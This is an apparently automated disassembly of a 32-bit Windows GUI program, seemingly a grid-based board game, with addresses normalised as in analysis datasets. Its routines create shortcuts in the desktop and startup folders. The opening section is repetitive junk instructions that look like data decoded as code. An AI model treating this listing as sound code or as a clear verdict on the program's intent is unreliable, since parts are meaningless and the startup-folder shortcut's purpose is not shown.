add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f4fe9
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
add al [ ebx + 0x77d04ec ]
sub_40495f
add esp 0x4
jae r-xdata
pop ecx
jno r-xdata
jmp [ 0x5c244481 ]
jae r-xdata
ja 0xffffffffecc39ea6
add [ esp + 0x5c ] r-xdata
sub esp 0x4
jne r-xdata
mov esp 0x7304c483
or al 0xe8
add eax 0x81000000
ja r-xdata
jmp 0xffffffff8d4f4fe9
jg r-xdata
je rw-data
jno r-xdata
mov edi 0xc368c483
add [ eax ] al
je 0xffffffff84003807
push ebx
call sub_404987
jge 0xffffffff844f53f3
jne r-xdata
push 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
add [ ebx + 0x545604ec ] 0x56
push eax
push ecx
call sub_4049b3
jpo 0x59284f29
les ebp [ eax - 0x3d ]
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3abf07
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53919e18
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
call sub_4049ce
mov esp 0x890f0573
out 0xff eax
and eax 0x5c244481
out dx al
dec ecx
inc eax
add [ ebx + 0x57504ec ] al
push edx
push ebp
sub esp 0xc
call sub_40495f
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_404999
sub esp 0x4
push esi
push esp
push esi
push eax
push ecx
call sub_4049b3
jpo 0x59284f29
jne r-xdata
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3abf07
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53919e18
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
call sub_4049ce
mov esp 0x890f0573
push edx
push ebp
sub esp 0xc
call sub_40495f
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
out dx al
dec ecx
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f4fe9
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_4049b3
pop edx
jae r-xdata
pop eax
jne r-xdata
sub ebx 0x10244483
push es
jge r-xdata
or eax 0xbb067358
ja r-xdata
jae 0x53919e18
pop eax
jae r-xdata
call 0xe3abf07
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
call sub_4049ce
mov esp 0x890f0573
sub esp 0x4
ja r-xdata
add [ esp + 0x10 ] 0x6
mov ebx 0x81f5735a
jmp r-xdata
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push edx
push ebp
sub esp 0xc
call sub_40495f
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
out dx al
dec ecx
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f4fe9
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_4049ce
jae r-xdata
pop edx
jns 0x5b003a4d
jmp [ esp + 0x24 ]
xor esi 0x242464ff
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
jns r-xdata
sub_404a20
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4019d0
push [ eax + 0x4 ]
push [ eax ]
call sub_4291a8
or ecx 0xffffffff
add esp 0x1c
test eax eax
cmovs eax ecx
pop ebp
retn
sub_404a70
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi [ ebp + 0xc ]
mov ebx ecx
push 0x208
mov [ ebp - 0x210 ] eax
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_40dea0
add esp 0xc
lea eax [ ebp - 0x20c ]
push 0x0
push 0x10
push eax
push 0x0
call [ SHGetSpecialFolderPathW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ lstrlenW@IAT ]
cmp [ ebp + eax * 2 - 0x20e ] 0x5c
lea eax [ ebp - 0x20c ]
je r-xdata
push edi
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x20c ]
mov ecx ebx
push eax
push [ ebp - 0x210 ]
call sub_404b20
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn 0x8
push r--data
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x20c ]
sub_404b20
push ebp
mov ebp esp
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
push esi
call [ CoInitialize@IAT ]
test eax eax
jns r-xdata
lea eax [ ebp - 0x418 ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
js r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x8
call [ CoUninitialize@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x418 ]
push edi
push eax
mov ecx [ eax ]
call [ ecx + 0x50 ]
push 0x104
push edi
mov edi [ lstrcpynW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call edi
lea eax [ ebp - 0x20c ]
push 0x5c
push eax
call sub_40e27d
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0x418 ]
lea edx [ ebp - 0x20c ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x418 ]
lea edx [ ebp - 0x41c ]
push edx
push r--data
push eax
mov ecx [ eax ]
call [ ecx ]
test eax eax
js r-xdata
xor ecx ecx
mov [ eax ] cx
mov eax [ ebp - 0x41c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov ecx [ ebp - 0x418 ]
push ecx
mov edx [ ecx ]
call [ edx + 0x8 ]
push 0x104
push ebx
lea eax [ ebp - 0x414 ]
push eax
call edi
push r--data
lea eax [ ebp - 0x414 ]
push eax
call [ lstrcatW@IAT ]
mov eax [ ebp - 0x41c ]
lea edx [ ebp - 0x414 ]
push 0x1
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
test eax eax
mov eax [ ebp - 0x41c ]
push eax
mov ecx [ eax ]
js r-xdata
call [ ecx + 0x8 ]
mov eax [ ebp - 0x418 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
call [ ecx + 0x8 ]
mov eax [ ebp - 0x418 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov esi 0x1
jmp r-xdata
sub_404c90
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x208
mov [ ebp - 0x210 ] eax
mov edi ecx
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_40dea0
add esp 0xc
lea eax [ ebp - 0x20c ]
push 0x0
push 0x1a
push eax
push 0x0
call [ SHGetSpecialFolderPathW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ lstrlenW@IAT ]
mov esi [ lstrcatW@IAT ]
cmp [ ebp + eax * 2 - 0x20e ] 0x5c
lea eax [ ebp - 0x20c ]
jne r-xdata
push r--data
push r--data
jmp r-xdata
push eax
call esi
push [ ebp - 0x210 ]
lea eax [ ebp - 0x20c ]
push eax
call esi
lea eax [ ebp - 0x20c ]
mov ecx edi
push eax
push ebx
call sub_404b20
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn 0x8
sub_404d50
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi [ ebp + 0xc ]
mov ebx ecx
push 0x208
mov [ ebp - 0x210 ] eax
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_40dea0
add esp 0xc
lea eax [ ebp - 0x20c ]
push 0x0
push 0x7
push eax
push 0x0
call [ SHGetSpecialFolderPathW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ lstrlenW@IAT ]
cmp [ ebp + eax * 2 - 0x20e ] 0x5c
lea eax [ ebp - 0x20c ]
je r-xdata
push edi
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x20c ]
mov ecx ebx
push eax
push [ ebp - 0x210 ]
call sub_404b20
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn 0x8
push r--data
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x20c ]
sub_404e20
push ebp
mov ebp esp
push 0xffffffff
push sub_44c2ca
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_404e00
push 0x7e0
mov [ ebp - 0x4 ] 0x0
call sub_40c344
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_401290
jmp r-xdata
push 0x1
push 0x1d7a2
push rw-data
mov ecx eax
mov [ ebp - 0x4 ] 0x0
call sub_4012c0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_404ec0
push ebp
mov ebp esp
push 0xffffffff
push sub_44c302
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x7e0
call sub_40c344
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_401290
jmp r-xdata
push 0x1
push 0x1d7a2
push rw-data
mov ecx eax
mov [ ebp - 0x4 ] 0xffffffff
call sub_4012c0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_404f40
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax 0x110
je r-xdata
mov eax 0x1
pop ebp
retn 0x10
sub eax 0x1
jne r-xdata
xor eax eax
pop ebp
retn 0x10
mov eax [ ebp + 0x10 ]
cmp ax 0x1
je r-xdata
movzx eax ax
push eax
push [ ebp + 0x8 ]
call [ EndDialog@IAT ]
cmp ax 0x2
jne r-xdata
sub_404f80
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
mov edi 0x22
mov eax [ ecx ]
cdq
idiv edi
mov esi eax
cmp edx 0x1
jl r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp edx 0x21
jg r-xdata
mov eax [ ecx + 0x4 ]
cdq
idiv edi
cmp edx 0x1
jl r-xdata
cmp edx 0x21
jg r-xdata
inc esi
lea edx [ eax + 0x1 ]
lea eax [ esi - 0x1 ]
cmp eax 0x8
ja r-xdata
lea eax [ edx - 0x1 ]
cmp eax 0x9
ja r-xdata
lea eax [ edi - 0x21 ]
mov [ ecx ] esi
pop edi
mov [ ecx + 0x4 ] edx
pop esi
pop ebp
retn
sub_404fe0
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x14 ]
push ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x18 ] eax
call [ GetDC@IAT ]
cmp [ rw-data ] 0x0
mov [ ebp - 0x24 ] eax
je r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea edi [ esi * 8 + rw-data ]
push edi
push esi
push rw-data
mov [ ebp - 0x20 ] edi
call sub_406e50
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
lea eax [ ecx + ecx * 2 ]
lea eax [ edx + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
cmp eax 0x20
je r-xdata
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
mov esi [ edi ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x30 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x28 ] eax
mov eax [ edi ]
push ebx
push [ rw-data ]
mov ebx [ rw-data ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov edi eax
mov [ rw-data ] eax
mov eax [ ebp - 0x20 ]
push rw-data
push rw-data
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
call sub_407590
xor eax eax
mov [ rw-data ] 0x20
cmp [ rw-data ] eax
sete al
mov [ rw-data ] eax
mov eax esi
shl eax 0x4
add eax esi
mov esi [ ebp - 0x24 ]
lea edx [ eax * 2 - 0x22 ]
mov eax edi
shl eax 0x4
add eax edi
mov [ ebp - 0x14 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_4059a0
mov ecx [ ebp - 0x1c ]
shl ecx 0x4
add ecx [ ebp - 0x1c ]
lea edx [ ecx * 2 - 0x22 ]
mov ecx [ ebp - 0x18 ]
shl ecx 0x4
lea eax [ edx + 0x22 ]
add ecx [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] edx
lea ecx [ ecx * 2 - 0x22 ]
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_4059a0
mov eax ebx
shl eax 0x4
add eax ebx
lea edx [ eax * 2 - 0x22 ]
mov eax [ ebp - 0x28 ]
shl eax 0x4
add eax [ ebp - 0x28 ]
mov [ ebp - 0x14 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_4059a0
mov eax [ ebp - 0x2c ]
shl eax 0x4
add eax [ ebp - 0x2c ]
lea edx [ eax * 2 - 0x22 ]
mov eax [ ebp - 0x30 ]
shl eax 0x4
add eax [ ebp - 0x30 ]
mov [ ebp - 0x14 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_4059a0
mov ecx [ rw-data ]
add esp 0x2c
mov eax [ ecx * 4 + r--data ]
pop ebx
cmp [ eax * 8 + rw-data ] 0x0
jne r-xdata
mov [ eax * 8 + rw-data ] 0x0
cmp [ rw-data ] ecx
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax 0x1
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x0
jne r-xdata
push [ rw-data ]
mov esi [ SetCursor@IAT ]
call esi
push [ ebp - 0x34 ]
call sub_405b90
add esp 0x4
push [ rw-data ]
call esi
sub_405250
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push 0x0
push eax
push 0x0
push 0x0
push 0x0
push 0x80000000
push 0x0
push 0x80000000
push 0xc80000
push rw-data
push rw-data
push 0x0
mov [ rw-data ] eax
call [ CreateWindowExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
push [ ebp + 0xc ]
push esi
call [ ShowWindow@IAT ]
push esi
call [ UpdateWindow@IAT ]
mov eax 0x1
pop esi
pop ebp
retn
pop esi
pop ebp
retn
sub_4052b0
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
push 0x6b
push eax
mov [ ebp - 0x30 ] 0x30
mov [ ebp - 0x2c ] 0x3
mov [ ebp - 0x28 ] sub_405f00
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] eax
call [ LoadIconW@IAT ]
push 0x6c
push [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x6d
mov [ ebp - 0x8 ] rw-data
call [ LoadIconW@IAT ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x30 ]
push eax
call [ RegisterClassExW@IAT ]
mov esp ebp
pop ebp
retn
sub_405330
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ LoadCursorW@IAT ]
push edi
push 0x83
push [ rw-data ]
mov [ ebp - 0x18 ] ebx
call esi
push 0x85
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x84
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov esi [ LoadIconW@IAT ]
push 0x9f
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa0
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa1
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa2
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa3
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa4
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa5
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x98
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x99
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x9a
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x9b
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x9c
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x9d
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x9e
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x82
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa6
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_4057e0
push ebx
call [ GetDC@IAT ]
mov esi eax
push esi
call [ CreateCompatibleDC@IAT ]
push 0x154
push 0x132
push esi
mov [ rw-data ] eax
call [ CreateCompatibleBitmap@IAT ]
push eax
push [ rw-data ]
mov [ rw-data ] eax
call [ SelectObject@IAT ]
push 0xa0d2b4
push [ rw-data ]
call sub_406570
movaps xmm0 [ r--data ]
lea eax [ ebp - 0x14 ]
add esp 0x8
movups [ ebp - 0x14 ] xmm0
push 0x1
push 0xc80000
push eax
call [ AdjustWindowRect@IAT ]
mov esi [ GetSystemMetrics@IAT ]
push 0x0
call esi
mov ecx [ ebp - 0x14 ]
sub ecx [ ebp - 0xc ]
add eax ecx
cdq
sub eax edx
mov edi eax
push 0x1
sar edi 0x1
call esi
mov ebx [ ebp - 0x10 ]
mov ecx ebx
mov esi [ ebp - 0x8 ]
sub ecx esi
add eax ecx
mov ecx [ ebp - 0xc ]
cdq
add ecx edi
sub eax edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x14 ]
sar eax 0x1
add edx edi
add ebx eax
mov [ ebp - 0x14 ] edx
add esi eax
mov [ ebp - 0x10 ] ebx
push 0x1
mov [ ebp - 0x8 ] esi
sub ecx edx
sub esi ebx
push esi
push ecx
push ebx
push edx
push [ ebp - 0x18 ]
call [ MoveWindow@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
sub_405590
push ebp
mov ebp esp
sub esp 0x8
cmp [ rw-data ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax 0x78787879
imul edi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov ecx esi
shl ecx 0x4
add ecx esi
add ecx ecx
sub edi ecx
cmp edi 0x1
jl r-xdata
pop edi
pop esi
cmp edi 0x21
jg r-xdata
mov edi [ ebp + 0x10 ]
mov eax 0x78787879
imul edi
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov eax ecx
shl eax 0x4
add eax ecx
add eax eax
sub edi eax
cmp edi 0x1
jl r-xdata
cmp edi 0x21
jg r-xdata
lea edx [ esi + 0x1 ]
lea eax [ edx - 0x1 ]
lea esi [ ecx + 0x1 ]
cmp eax 0x8
ja r-xdata
lea eax [ esi - 0x1 ]
cmp eax 0x9
ja r-xdata
lea eax [ edx + edx * 2 ]
mov [ ebp + 0xc ] edx
lea eax [ esi + eax * 4 ]
mov [ ebp + 0x10 ] esi
mov ecx [ eax * 4 + rw-data ]
xor eax eax
cmp [ rw-data ] eax
sete al
cmp [ ecx * 4 + r--data ] eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x20
je r-xdata
push ebx
push [ ebp + 0x8 ]
call [ GetDC@IAT ]
mov ecx [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] 0x0
cmp ecx 0x20
je r-xdata
push esi
push edx
push eax
push [ ebp + 0x8 ]
call sub_404fe0
add esp 0x10
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov esi [ ecx * 8 + rw-data ]
mov edi [ ecx * 8 + rw-data ]
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
pop ebx
push edi
push esi
push ebx
call sub_405930
add esp 0xc
mov eax [ ebp + 0xc ]
lea ecx [ eax + eax * 2 ]
mov eax [ ebp + 0x10 ]
lea eax [ eax + ecx * 4 ]
mov eax [ eax * 4 + rw-data ]
mov [ rw-data ] eax
push [ eax * 8 + rw-data ]
push [ eax * 8 + rw-data ]
push ebx
call sub_405930
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4056f0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax 0x78787879
imul edi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov ecx esi
shl ecx 0x4
add ecx esi
add ecx ecx
sub edi ecx
cmp edi 0x1
jl r-xdata
pop edi
pop esi
pop ebp
retn
cmp edi 0x21
jg r-xdata
mov ecx [ ebp + 0xc ]
mov eax 0x78787879
imul ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
mov eax edi
shl eax 0x4
add eax edi
add eax eax
sub ecx eax
cmp ecx 0x1
jl r-xdata
cmp ecx 0x21
jg r-xdata
lea ecx [ esi + 0x1 ]
lea eax [ ecx - 0x1 ]
lea esi [ edi + 0x1 ]
cmp eax 0x8
ja r-xdata
lea eax [ esi - 0x1 ]
cmp eax 0x9
ja r-xdata
mov edx [ rw-data ]
mov [ ebp + 0x8 ] ecx
mov [ ebp + 0xc ] esi
cmp edx 0x20
je r-xdata
lea eax [ ecx + ecx * 2 ]
lea eax [ esi + eax * 4 ]
mov ecx [ eax * 4 + rw-data ]
xor eax eax
cmp [ rw-data ] eax
sete al
cmp [ ecx * 4 + r--data ] eax
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea eax [ edx * 8 + rw-data ]
push eax
push edx
push rw-data
call sub_406e50
add esp 0x10
test eax eax
je r-xdata
push [ rw-data ]
call [ SetCursor@IAT ]
pop edi
pop esi
pop ebp
retn
push [ rw-data ]
call [ SetCursor@IAT ]
sub_4057e0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
push 0x0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
push rw-data
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
push rw-data
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
mov [ rw-data ] 0x0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
call sub_407590
add esp 0xc
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x20
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
retn
sub_405930
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
shl ecx 0x4
add ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
lea edx [ ecx * 2 - 0x22 ]
mov ecx [ ebp + 0x10 ]
shl ecx 0x4
lea eax [ edx + 0x22 ]
add ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] edx
lea ecx [ ecx * 2 - 0x22 ]
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_4059a0
mov ecx [ ebp - 0x4 ]
add esp 0x8
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
sub_4059a0
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
movaps xmm0 [ r--data ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push eax
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x20 ] ebx
push eax
push eax
movups [ ebp - 0x14 ] xmm0
call [ IntersectRect@IAT ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
push 0xcc0020
push edx
push ecx
push [ rw-data ]
sub eax edx
push eax
mov eax [ ebp - 0xc ]
sub eax ecx
push eax
push edx
push ecx
push ebx
call [ BitBlt@IAT ]
mov eax 0x78787879
imul [ ebp - 0x10 ]
mov eax 0x78787879
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
imul [ ebp - 0xc ]
